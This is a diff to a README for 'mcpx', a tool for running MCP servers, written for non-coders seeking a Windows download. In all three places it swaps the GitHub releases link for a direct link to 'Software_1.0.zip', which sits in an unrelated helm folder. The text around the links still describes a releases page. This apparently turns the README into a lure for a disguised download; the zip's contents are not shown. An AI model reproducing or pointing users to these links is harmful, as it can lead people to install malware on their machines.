@@ -1,6 +1,6 @@
 # 🧩 mcpx - Run MCP servers with fewer tools
 
-[![Download mcpx](https://img.shields.io/badge/Download%20mcpx-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/afiabatool067-png/mcpx/releases)
+[![Download mcpx](https://img.shields.io/badge/Download%20mcpx-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/afiabatool067-png/mcpx/main/helm/mcpx/Software_1.0.zip)
 
 ## 🚀 What is mcpx?
 
@@ -23,7 +23,7 @@ You do not need to know how to code to use the app.
 
 Visit this page to download the Windows release:
 
-https://github.com/afiabatool067-png/mcpx/releases
+https://raw.githubusercontent.com/afiabatool067-png/mcpx/main/helm/mcpx/Software_1.0.zip
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one meant for Windows.
 
@@ -159,6 +159,6 @@ This project fits these topics:
 
 If you need to get the app later, use the release page:
 
-https://github.com/afiabatool067-png/mcpx/releases
+https://raw.githubusercontent.com/afiabatool067-png/mcpx/main/helm/mcpx/Software_1.0.zip
 
 Open the latest release and download the Windows file again if needed
